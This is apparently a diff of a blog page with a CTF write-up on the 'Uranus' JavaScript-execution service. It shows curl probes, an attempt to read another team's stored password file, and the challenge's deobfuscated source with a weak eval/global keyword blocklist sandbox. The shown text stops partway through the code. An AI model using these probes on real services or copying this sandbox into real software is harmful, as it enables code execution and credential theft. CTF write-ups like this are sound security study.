@@ -33,6 +33,15 @@
         <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
     <![endif]-->
 
+    <script>
+      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+      })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+      ga('create', 'UA-1277369-13', 'auto');
+      ga('send', 'pageview');
+    </script>
+
 </head>
 
 
@@ -57,14 +66,6 @@
             <ul class="nav navbar-nav navbar-right">
                 <li>
                     <a href="/">Home</a>
-                </li>
-                
-                <li>
-                    <a href="/about.html">About</a>
-                </li>
-                
-                <li>
-                    <a href="/contact.html">Contact</a>
                 </li>
                 
             </ul>
@@ -100,441 +101,430 @@
 
 <!-- more -->
 
-<h2 id="initial-exploration">Initial exploration</h2>
+<h2>Initial exploration</h2>
 
 <p>It was very easy to get it running locally (it had no external dependencies besides node.js itself) and explore the basic functionality:</p>
-
-<p>```bash
-$ curl localhost:1337
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>curl localhost:1337
 Welcome to Uranus!
 With the last update of our nuclear reactor we can now control critical variables of the process
-through the easyness of JavaScript. Uranus is here to proof-check your code for safety before
-you submit it directly to the reactor.</p>
+through the easyness of JavaScript. Uranus is here to proof-check your code <span class="k">for</span> safety before
+you submit it directly to the reactor. 
 
-<p>Use HTTP POST to submit your code.</p>
+Use HTTP POST to submit your code.
 
-<p>$ curl -d ‘abcd’ localhost:1337
-Your JSON is malformed. Please provide the following properties: flag_id, token, code</p>
+<span class="nv">$ </span>curl -d <span class="s1">&#39;abcd&#39;</span> localhost:1337
+Your JSON is malformed. Please provide the following properties: flag_id, token, code
 
-<p>$ curl -d ‘{“flag_id”: 1, “token”: 2, “code”: “console.log(1234)”}’ localhost:1337
+<span class="nv">$ </span>curl -d <span class="s1">&#39;{&quot;flag_id&quot;: 1, &quot;token&quot;: 2, &quot;code&quot;: &quot;console.log(1234)&quot;}&#39;</span> localhost:1337
 Your code is missing an access code to the nuclear reactor. Expected variable according to the
-documentation is “password”.
-```</p>
-
-<p>When submitting this, the the ‘1234’ string appeared on the server’s stdout so it was obviously executing the submitted code. The error message says that a variable named password must be set:</p>
-
-<p>```bash
-$ curl -d ‘{“flag_id”: 1, “token”:2, “code”: “var password = 5”}’ localhost:1337
+documentation is <span class="s2">&quot;password&quot;</span>.
+</code></pre></div>
+<p>When submitting this, the the &#39;1234&#39; string appeared on the server&#39;s stdout so it was obviously executing the submitted code. The error message says that a variable named password must be set:</p>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>curl -d <span class="s1">&#39;{&quot;flag_id&quot;: 1, &quot;token&quot;:2, &quot;code&quot;: &quot;var password = 5&quot;}&#39;</span> localhost:1337
 Your code is missing an access code to the nuclear reactor. Expected variable according to the
-documentation is “password”.</p>
+documentation is <span class="s2">&quot;password&quot;</span>.
 
-<p>$ curl -d ‘{“flag_id”: 1, “token”:2, “code”: “var password = "a"”}’ localhost:1337
+<span class="nv">$ </span>curl -d <span class="s1">&#39;{&quot;flag_id&quot;: 1, &quot;token&quot;:2, &quot;code&quot;: &quot;var password = \&quot;a\&quot;&quot;}&#39;</span> localhost:1337
 Code approved. Please check your parameters carefully before deploying the code to the nuclear
 reactor.
-```</p>
-
+</code></pre></div>
 <p>At this point, the service has created a file in the <code>submissions</code> directory named <code>1-2</code> containing the submitted code.</p>
 
-<p>Since it was before the level 4 (the last few hours of the CTF) when we started working on this, we did not see any legitim traffic yet. Based on these experiments, it was clear that the legitim traffic should consist of code uploads. The exploit code gets the flag_id as a parameter. This identifies a certain uploaded code (except that we don’t know the token). The flag must be the password that was used when uploading the file.</p>
+<p>Since it was before the level 4 (the last few hours of the CTF) when we started working on this, we did not see any legitim traffic yet. Based on these experiments, it was clear that the legitim traffic should consist of code uploads. The exploit code gets the flag_id as a parameter. This identifies a certain uploaded code (except that we don&#39;t know the token). The flag must be the password that was used when uploading the file.</p>
 
-<p>Let’s try to read a file with the submitted code:</p>
-
-<p><code>
-$ curl -d '{"flag_id": 2, "token": 3, "code": "console.log(require(\"fs\").readFileSync(\"submissions/1-2\"))"}' localhost:1337
+<p>Let&#39;s try to read a file with the submitted code:</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">$ curl -d &#39;{&quot;flag_id&quot;: 2, &quot;token&quot;: 3, &quot;code&quot;: &quot;console.log(require(\&quot;fs\&quot;).readFileSync(\&quot;submissions/1-2\&quot;))&quot;}&#39; localhost:1337
 Your code has runtime errors: ReferenceError: require is not defined
-</code></p>
+</code></pre></div>
+<p><code>require</code> is the function used to import modules in node.js and it was not available so it was not possible to import the filesystem module needed to manipulate files... After a few more trial, I decided to look at the source code to find a way to read files and send the content back to the exploit.</p>
 
-<p><code>require</code> is the function used to import modules in node.js and it was not available so it was not possible to import the filesystem module needed to manipulate files… After a few more trial, I decided to look at the source code to find a way to read files and send the content back to the exploit.</p>
-
-<h2 id="deobfuscation">Deobfuscation</h2>
+<h2>Deobfuscation</h2>
 
 <p>The source code looked terribly obfuscated, but fortunately, the obfuscation <em>seemed</em> to be easy to revert. The obfuscated code worked like this:</p>
 
 <ol>
-  <li>Fill an array with seemingly random bytes</li>
-  <li>Do some magic</li>
-  <li><code>eval()</code> the resulting string</li>
+<li>Fill an array with seemingly random bytes</li>
+<li>Do some magic</li>
+<li><code>eval()</code> the resulting string</li>
 </ol>
 
 <p>Replacing the <code>eval()</code> with <code>console.log()</code> showed the deobfuscated source code. After prettifying the resulting code:</p>
-
-<p><code>javascript
-var r3A8 = (function () {
-  var U8 = (function (Z8, S8) {
-    var D8 = "", C8 = 'return ', e8 = ((0x1B2, 95.) &lt; (45, 92.60E1) ? (7.07E2, false) : (110., 6.2E1) &gt; 0x179 ? 1 : (129, 9.4E2));
-    if (Z8.length &gt; ((0x1EF, 21.) &lt; (1.18E3, 14) ? (0x139, 1) : 32. &gt; (23, 0xB9) ? (1.97E2, "R") : (6.350E2, 97.) &lt;= 0x1F9 ? (39., 12) : (31.3E1, 0x1B5)))for (var r8 = ((117., 140.) &lt;= (0x18A, 138.) ? (0xA9, "z") : (17., 1.71E2) &lt;= (0x212, 58.) ? (147.8E1, 130) : 0x106 &lt; (33., 0x226) ? (26., 13) : (0x1D2, 0xFB)); r8 &gt; ((54.30E1, 0xF1) &gt;= (1.5E1, 7.390E2) ? (0, 38.1E1) : (0x1F9, 0x133) &gt; 79.10E1 ? (68, '\n') : (133.1E1, 81) &lt; 0x173 ? (22., 1) : (1.241E3, 0x41));)D8 += (e8 = (e8 ? ((76, 0x167) &lt; (6.2E2, 12.93E2) ? (18.0E1, false) : (0x127, 90.80E1) &lt;= 1.16E2 ? (7.96E2, 0x69) : (10.93E2, 22.8E1)) : ((0x1F8, 0x1FE) &gt; (30.1E1, 124.) ? (31., true) : (37.80E1, 110.7E1)))) ? Z8.charAt(r8) : "@%)eitg)(tDwn".charAt(r8--);
-    return S8 === ((49.5E1, 0x8B) &gt; (61, 0x20D) ? (56.6E1, "l") : (147, 106) &lt;= (0x15, 131.) ? (56, null) : (109., 95.2E1)) ? [(145.5E1 &gt; (4.11E2, 0x1C5) ? (0x244, null) : 14.67E2 &lt;= (100, 119.) ? (75.4E1, false) : (0x16D, 106.) &lt; 12. ? 0x222 : (8.64E2, 0xF5))].constructor.constructor(C8 + D8)() : S8 ^ Z8
-  })("_9(mTe.)ea e(", ((0x127, 0x216) &gt; (130.6E1, 0x25) ? (2.36E2, null) : (62., 142) &lt; (0x251, 72) ? (128.0E1, 'R') : (0x19, 90.30E1) &lt; 21. ? (127, 9.5E2) : (0x4D, 9.540E2)));
-  return {J8: function (H8) {
-    var g8, R8 = ((1.414E3, 117) &gt;= 70. ? (12.0E1, 0) : (73.5E1, 147.70E1) &lt;= 2.5E1 ? (1.3980E3, true) : (53, 98.2E1)), W8 = ((44.6E1, 130.20E1) &gt; 0x133 ? (24.6E1, 0x142CF49F580) : (12.9E1, 10.) &gt;= 133. ? (107., 0x193) : (0x240, 0x4E)) &gt; U8, G8;
-    for (; R8 &lt; H8.length; R8++) {
-      G8 = (parseInt(H8.charAt(R8), 16)).toString((14. &gt; (0x9D, 0x21D) ? (0x155, 0xCD) : (42.40E1, 141.) &lt;= 76. ? (3.25E2, 42) : 132. &lt; (0x62, 11.99E2) ? (94.10E1, 2) : (0x8B, 34)));
-      g8 = R8 == 0 ? G8.charAt(G8.length - 1) : g8 ^ G8.charAt(G8.length - 1)
-    }
-    return g8 ? W8 : !W8
-  }};
-})();
-var z9o2 = r3A8.J8("63") ? {'p2': "length", 'n2': "fs", 'w4': "toString", 'J4': "-", 'v2': "listen", 'R4': "log", 'a4': 'uncaughtException', 'd2': '0.0.0.0', 'c4': 'Server running at http://0.0.0.0:1337/', 'Q4': "http", 'N4': 'text/plain', 'W4': "createServer", 'Q2': {}, 'M4': 1337, 't2': "on", 's4': "submissions", 'x2': "/", 'y2': 1, 'X2': 200, 'f2': "end", 'l2': "", 'A4': "writeHead"} : 1337;
-function handle(E, b) {
-  var k = r3A8.J8("aa2e") ? 'You suck\n' : 'Welcome to Uranus!\nWith the last update of our nuclear reactor we can now control critical variables of the process through the easyness of JavaScript. Uranus is here to proof-check your code for safety before you submit it directly to the reactor. \n\nUse HTTP POST to submit your code.', V = r3A8.J8("f56") ? "test" : "POST", s = r3A8.J8("a6cf") ? "indexOf" : "l", c = r3A8.J8("5613") ? "method" : "writeFileSync";
-  if (E[c][s](V) != -z9o2.y2) {
-    handlePOST(E, b);
-    return;
-  } else {
-    b[z9o2.A4](z9o2.X2, {'Content-Type': z9o2.N4});
-    b[z9o2.f2](k);
-  }
-}
-function makeSandbox() {
-  delete  eval;
-  delete  Function;
-  delete  require;
-  delete  fs;
-}
-function loadSubmission(b, k) {
-  var V = r3A8.J8("81") ? "No password found" : "token", s = r3A8.J8("c14") ? "match" : "toString", c = r3A8.J8("5f") ? "eval" : "readFileSync", w = r3A8.J8("ffb7") ? 'Server running at http://0.0.0.0:1337/' : z9o2.s4, z = r3A8.J8("fb") ? 'Your code has runtime errors: ' : b + z9o2.J4 + k;
-  try {
-    var O = r3A8.J8("67cf") ? "Code contains unsafe functionality.\n" : ff[c](w + z9o2.x2 + z)[z9o2.w4]();
-    return O[s](/password = "([0-9a-zA-Z]{16})"/)[z9o2.y2];
-  } catch (E) {
-    ;
-  }
-  return V;
-}
-function test(b) {
-  var k = r3A8.J8("1b") ? "k" : "runInThisContext", V = r3A8.J8("81e") ? "vm" : "handlePOST", s = r3A8.J8("74") ? function (E) {
-    global = r3A8.J8("a11a") ? "g" : E;
-  } : false, c = r3A8.J8("33c1") ? function (E) {
-    password = r3A8.J8("77") ? "loadSubmission" : E;
-  } : "submissions", w = r3A8.J8("d5") ? "retval" : require(V);
-  c(z9o2.l2);
-  s(z9o2.l2);
-  w[k](b[z9o2.w4]());
-  return password;
-}
-function storeSubmission(b, k, V) {
-  var s = r3A8.J8("ac") ? "handle" : "writeFileSync", c = r3A8.J8("3a8") ? "mkdirSync" : "http", w = r3A8.J8("6ef") ? "statSync" : "err", z = z9o2.s4, O = b + z9o2.J4 + k;
-  try {
-    var Z = ff[w](z);
-  } catch (E) {
-    ;
-  }
-  if (!Z)ff[c](z);
-  ff[s](z + z9o2.x2 + O, V);
-}
-function checkCode(E) {
-  var b = r3A8.J8("61") ? true : "res", k = r3A8.J8("2f7") ? "test" : false, V = "test", s = r3A8.J8("3ae") ? ((30, 0xC4) &lt; (96.5E1, 9) ? 'R' : (105.2E1, 44.) &gt;= (142, 1.183E3) ? (110, 133.70E1) : 120. &gt; (53.6E1, 96) ? (0x24A, "q") : (8.4E1, 1.5E1)) : "writeFileSync", c = r3A8.J8("ba") ? ((9.99E2, 119.80E1) &lt;= (24., 10.96E2) ? '\n' : 131 &gt;= (0x105, 0x132) ? '\n' : (1.0010E3, 72) &lt;= 23.90E1 ? (124., 0) : (100., 0x254)) : "data", w = [/eval/, /global/, /Function/, /this/];
-  for (var z = c; A3a[s](z, w[z9o2.p2]); z++) {
-    if (w[z][V](E)) {
-      return k;
-    }
-  }
-  return b;
-}
-function handlePOST(G, A) {
-  var N = r3A8.J8("e1c") ? "data" : "hasOwnProperty";
-  G[z9o2.t2](N, function (k) {
-    var V = 'Your JSON is malformed. Please provide the following properties: flag_id, token, code\n', s = 'Code contains unsafe functionality.\n', c = r3A8.J8("46cf") ? 'Your code is missing an access code to the nuclear reactor. Expected variable according to the documentation is "password".\n' : "Received: %s", w = r3A8.J8("53") ? 'text/plain' : 'Code approved. Please check your parameters carefully before deploying the code to the nuclear reactor.\n', z = r3A8.J8("555") ? "U" : "i", O = r3A8.J8("8ccd") ? '\n' : true, Z = 'Your password: ', e = "code", T = "token", D = r3A8.J8("2235") ? "e" : "flag_id", J = r3A8.J8("8f") ? "hasOwnProperty" : "hasOwnProperty", R = r3A8.J8("2fb") ? "patterns" : "parse";
-    try {
-      data_json = JSON[R](k);
-    } catch (E) {
-      var b = function () {
-        data_json = r3A8.J8("265") ? {} : ((0x17B, 149.) &gt;= (30., 0x20F) ? (12.17E2, "vm") : (7.79E2, 128) &lt;= 0x1A6 ? (21.90E1, 200) : (57., 53.) &gt; 106.7E1 ? (7.26E2, 84.) : (11.61E2, 1.5E2));
-      };
-      b();
-    }
-    if (data_json[J](D) &amp;&amp; data_json[J](T)) {
-      if (!data_json[J](e)) {
-        old_password = loadSubmission(data_json[D], data_json[T]);
-        A[z9o2.A4](z9o2.X2, {'Content-Type': z9o2.N4});
-        A[z9o2.f2](Z + old_password + O);
-      } else {
-        var W = r3A8.J8("d6b7") ? function (E) {
-          code = E[e];
-        } : "No password found", B = function (E) {
-          password = r3A8.J8("5c78") ? "retval" : E;
-        };
-        B(z9o2.l2);
-        W(data_json);
-        if (checkCode(code)) {
-          try {
-            retval = r3A8.J8("c4") ? "Server running at http://0.0.0.0:1337/" : test(code[z9o2.w4]());
-          } catch (E) {
-            var b = r3A8.J8("b38a") ? "Your password: " : 'Your code has runtime errors: ';
-            A[z9o2.A4](z9o2.X2, {'Content-Type': z9o2.N4});
-            A[z9o2.f2](b + E + O);
-          }
-          try {
-            if (A3a[z](password[z9o2.p2], z9o2.y2)) {
-              storeSubmission(data_json[D], data_json[T], code);
-              A[z9o2.A4](z9o2.X2, {'Content-Type': z9o2.N4});
-              A[z9o2.f2](w);
-            }
-          } catch (E) {
-            console[z9o2.R4](E);
-          }
-          A[z9o2.A4](z9o2.X2, {'Content-Type': z9o2.N4});
-          A[z9o2.f2](c);
-        }
-      }
-      A[z9o2.A4](z9o2.X2, {'Content-Type': z9o2.N4});
-      A[z9o2.f2](s);
-    } else {
-      A[z9o2.A4](z9o2.X2, {'Content-Type': z9o2.N4});
-      A[z9o2.f2](V);
-    }
-  });
-}
-var A3a = {'U': function (E, b) {
-  return E &gt;= b;
-}, 'q': function (E, b) {
-  return E &lt; b;
-}, 'M': {}};
-http = r3A8.J8("c534") ? "submissions" : require(z9o2.Q4);
-ff = r3A8.J8("6422") ? 200 : require(z9o2.n2);
-process[z9o2.t2](z9o2.a4, function (E) {
-  var b = 'Caught exception: ';
-  console[z9o2.R4](b + E);
-});
-http[z9o2.W4](handle)[z9o2.v2](z9o2.M4, z9o2.d2);
-console[z9o2.R4](z9o2.c4)
-</code></p>
-
+<div class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="kd">var</span> <span class="nx">r3A8</span> <span class="o">=</span> <span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
+  <span class="kd">var</span> <span class="nx">U8</span> <span class="o">=</span> <span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">Z8</span><span class="p">,</span> <span class="nx">S8</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">D8</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="nx">C8</span> <span class="o">=</span> <span class="s1">&#39;return &#39;</span><span class="p">,</span> <span class="nx">e8</span> <span class="o">=</span> <span class="p">((</span><span class="mh">0x1B2</span><span class="p">,</span> <span class="mi">95</span><span class="p">.)</span> <span class="o">&lt;</span> <span class="p">(</span><span class="mi">45</span><span class="p">,</span> <span class="mf">92.60E1</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="mf">7.07E2</span><span class="p">,</span> <span class="kc">false</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mi">110</span><span class="p">.,</span> <span class="mf">6.2E1</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mh">0x179</span> <span class="o">?</span> <span class="mi">1</span> <span class="o">:</span> <span class="p">(</span><span class="mi">129</span><span class="p">,</span> <span class="mf">9.4E2</span><span class="p">));</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">Z8</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="p">((</span><span class="mh">0x1EF</span><span class="p">,</span> <span class="mi">21</span><span class="p">.)</span> <span class="o">&lt;</span> <span class="p">(</span><span class="mf">1.18E3</span><span class="p">,</span> <span class="mi">14</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="mh">0x139</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">:</span> <span class="mi">32</span><span class="p">.</span> <span class="o">&gt;</span> <span class="p">(</span><span class="mi">23</span><span class="p">,</span> <span class="mh">0xB9</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="mf">1.97E2</span><span class="p">,</span> <span class="s2">&quot;R&quot;</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mf">6.350E2</span><span class="p">,</span> <span class="mi">97</span><span class="p">.)</span> <span class="o">&lt;=</span> <span class="mh">0x1F9</span> <span class="o">?</span> <span class="p">(</span><span class="mi">39</span><span class="p">.,</span> <span class="mi">12</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mf">31.3E1</span><span class="p">,</span> <span class="mh">0x1B5</span><span class="p">)))</span><span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">r8</span> <span class="o">=</span> <span class="p">((</span><span class="mi">117</span><span class="p">.,</span> <span class="mi">140</span><span class="p">.)</span> <span class="o">&lt;=</span> <span class="p">(</span><span class="mh">0x18A</span><span class="p">,</span> <span class="mi">138</span><span class="p">.)</span> <span class="o">?</span> <span class="p">(</span><span class="mh">0xA9</span><span class="p">,</span> <span class="s2">&quot;z&quot;</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mi">17</span><span class="p">.,</span> <span class="mf">1.71E2</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="p">(</span><span class="mh">0x212</span><span class="p">,</span> <span class="mi">58</span><span class="p">.)</span> <span class="o">?</span> <span class="p">(</span><span class="mf">147.8E1</span><span class="p">,</span> <span class="mi">130</span><span class="p">)</span> <span class="o">:</span> <span class="mh">0x106</span> <span class="o">&lt;</span> <span class="p">(</span><span class="mi">33</span><span class="p">.,</span> <span class="mh">0x226</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="mi">26</span><span class="p">.,</span> <span class="mi">13</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mh">0x1D2</span><span class="p">,</span> <span class="mh">0xFB</span><span class="p">));</span> <span class="nx">r8</span> <span class="o">&gt;</span> <span class="p">((</span><span class="mf">54.30E1</span><span class="p">,</span> <span class="mh">0xF1</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="mf">1.5E1</span><span class="p">,</span> <span class="mf">7.390E2</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mf">38.1E1</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mh">0x1F9</span><span class="p">,</span> <span class="mh">0x133</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mf">79.10E1</span> <span class="o">?</span> <span class="p">(</span><span class="mi">68</span><span class="p">,</span> <span class="s1">&#39;\n&#39;</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mf">133.1E1</span><span class="p">,</span> <span class="mi">81</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mh">0x173</span> <span class="o">?</span> <span class="p">(</span><span class="mi">22</span><span class="p">.,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mf">1.241E3</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">));)</span><span class="nx">D8</span> <span class="o">+=</span> <span class="p">(</span><span class="nx">e8</span> <span class="o">=</span> <span class="p">(</span><span class="nx">e8</span> <span class="o">?</span> <span class="p">((</span><span class="mi">76</span><span class="p">,</span> <span class="mh">0x167</span><span class="p">)</span> <span class="o">&lt;</span> <span class="p">(</span><span class="mf">6.2E2</span><span class="p">,</span> <span class="mf">12.93E2</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="mf">18.0E1</span><span class="p">,</span> <span class="kc">false</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mh">0x127</span><span class="p">,</span> <span class="mf">90.80E1</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mf">1.16E2</span> <span class="o">?</span> <span class="p">(</span><span class="mf">7.96E2</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mf">10.93E2</span><span class="p">,</span> <span class="mf">22.8E1</span><span class="p">))</span> <span class="o">:</span> <span class="p">((</span><span class="mh">0x1F8</span><span class="p">,</span> <span class="mh">0x1FE</span><span class="p">)</span> <span class="o">&gt;</span> <span class="p">(</span><span class="mf">30.1E1</span><span class="p">,</span> <span class="mi">124</span><span class="p">.)</span> <span class="o">?</span> <span class="p">(</span><span class="mi">31</span><span class="p">.,</span> <span class="kc">true</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mf">37.80E1</span><span class="p">,</span> <span class="mf">110.7E1</span><span class="p">))))</span> <span class="o">?</span> <span class="nx">Z8</span><span class="p">.</span><span class="nx">charAt</span><span class="p">(</span><span class="nx">r8</span><span class="p">)</span> <span class="o">:</span> <span class="s2">&quot;@%)eitg)(tDwn&quot;</span><span class="p">.</span><span class="nx">charAt</span><span class="p">(</span><span class="nx">r8</span><span class="o">--</span><span class="p">);</span>
+    <span class="k">return</span> <span class="nx">S8</span> <span class="o">===</span> <span class="p">((</span><span class="mf">49.5E1</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">)</span> <span class="o">&gt;</span> <span class="p">(</span><span class="mi">61</span><span class="p">,</span> <span class="mh">0x20D</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="mf">56.6E1</span><span class="p">,</span> <span class="s2">&quot;l&quot;</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mi">147</span><span class="p">,</span> <span class="mi">106</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="p">(</span><span class="mh">0x15</span><span class="p">,</span> <span class="mi">131</span><span class="p">.)</span> <span class="o">?</span> <span class="p">(</span><span class="mi">56</span><span class="p">,</span> <span class="kc">null</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mi">109</span><span class="p">.,</span> <span class="mf">95.2E1</span><span class="p">))</span> <span class="o">?</span> <span class="p">[(</span><span class="mf">145.5E1</span> <span class="o">&gt;</span> <span class="p">(</span><span class="mf">4.11E2</span><span class="p">,</span> <span class="mh">0x1C5</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="mh">0x244</span><span class="p">,</span> <span class="kc">null</span><span class="p">)</span> <span class="o">:</span> <span class="mf">14.67E2</span> <span class="o">&lt;=</span> <span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="mi">119</span><span class="p">.)</span> <span class="o">?</span> <span class="p">(</span><span class="mf">75.4E1</span><span class="p">,</span> <span class="kc">false</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mh">0x16D</span><span class="p">,</span> <span class="mi">106</span><span class="p">.)</span> <span class="o">&lt;</span> <span class="mi">12</span><span class="p">.</span> <span class="o">?</span> <span class="mh">0x222</span> <span class="o">:</span> <span class="p">(</span><span class="mf">8.64E2</span><span class="p">,</span> <span class="mh">0xF5</span><span class="p">))].</span><span class="nx">constructor</span><span class="p">.</span><span class="nx">constructor</span><span class="p">(</span><span class="nx">C8</span> <span class="o">+</span> <span class="nx">D8</span><span class="p">)()</span> <span class="o">:</span> <span class="nx">S8</span> <span class="o">^</span> <span class="nx">Z8</span>
+  <span class="p">})(</span><span class="s2">&quot;_9(mTe.)ea e(&quot;</span><span class="p">,</span> <span class="p">((</span><span class="mh">0x127</span><span class="p">,</span> <span class="mh">0x216</span><span class="p">)</span> <span class="o">&gt;</span> <span class="p">(</span><span class="mf">130.6E1</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="mf">2.36E2</span><span class="p">,</span> <span class="kc">null</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mi">62</span><span class="p">.,</span> <span class="mi">142</span><span class="p">)</span> <span class="o">&lt;</span> <span class="p">(</span><span class="mh">0x251</span><span class="p">,</span> <span class="mi">72</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="mf">128.0E1</span><span class="p">,</span> <span class="s1">&#39;R&#39;</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mh">0x19</span><span class="p">,</span> <span class="mf">90.30E1</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">21</span><span class="p">.</span> <span class="o">?</span> <span class="p">(</span><span class="mi">127</span><span class="p">,</span> <span class="mf">9.5E2</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mh">0x4D</span><span class="p">,</span> <span class="mf">9.540E2</span><span class="p">)));</span>
+  <span class="k">return</span> <span class="p">{</span><span class="nx">J8</span><span class="o">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">H8</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">g8</span><span class="p">,</span> <span class="nx">R8</span> <span class="o">=</span> <span class="p">((</span><span class="mf">1.414E3</span><span class="p">,</span> <span class="mi">117</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">70</span><span class="p">.</span> <span class="o">?</span> <span class="p">(</span><span class="mf">12.0E1</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mf">73.5E1</span><span class="p">,</span> <span class="mf">147.70E1</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mf">2.5E1</span> <span class="o">?</span> <span class="p">(</span><span class="mf">1.3980E3</span><span class="p">,</span> <span class="kc">true</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mi">53</span><span class="p">,</span> <span class="mf">98.2E1</span><span class="p">)),</span> <span class="nx">W8</span> <span class="o">=</span> <span class="p">((</span><span class="mf">44.6E1</span><span class="p">,</span> <span class="mf">130.20E1</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mh">0x133</span> <span class="o">?</span> <span class="p">(</span><span class="mf">24.6E1</span><span class="p">,</span> <span class="mh">0x142CF49F580</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mf">12.9E1</span><span class="p">,</span> <span class="mi">10</span><span class="p">.)</span> <span class="o">&gt;=</span> <span class="mi">133</span><span class="p">.</span> <span class="o">?</span> <span class="p">(</span><span class="mi">107</span><span class="p">.,</span> <span class="mh">0x193</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mh">0x240</span><span class="p">,</span> <span class="mh">0x4E</span><span class="p">))</span> <span class="o">&gt;</span> <span class="nx">U8</span><span class="p">,</span> <span class="nx">G8</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(;</span> <span class="nx">R8</span> <span class="o">&lt;</span> <span class="nx">H8</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">R8</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+      <span class="nx">G8</span> <span class="o">=</span> <span class="p">(</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">H8</span><span class="p">.</span><span class="nx">charAt</span><span class="p">(</span><span class="nx">R8</span><span class="p">),</span> <span class="mi">16</span><span class="p">)).</span><span class="nx">toString</span><span class="p">((</span><span class="mi">14</span><span class="p">.</span> <span class="o">&gt;</span> <span class="p">(</span><span class="mh">0x9D</span><span class="p">,</span> <span class="mh">0x21D</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="mh">0x155</span><span class="p">,</span> <span class="mh">0xCD</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mf">42.40E1</span><span class="p">,</span> <span class="mi">141</span><span class="p">.)</span> <span class="o">&lt;=</span> <span class="mi">76</span><span class="p">.</span> <span class="o">?</span> <span class="p">(</span><span class="mf">3.25E2</span><span class="p">,</span> <span class="mi">42</span><span class="p">)</span> <span class="o">:</span> <span class="mi">132</span><span class="p">.</span> <span class="o">&lt;</span> <span class="p">(</span><span class="mh">0x62</span><span class="p">,</span> <span class="mf">11.99E2</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="mf">94.10E1</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mh">0x8B</span><span class="p">,</span> <span class="mi">34</span><span class="p">)));</span>
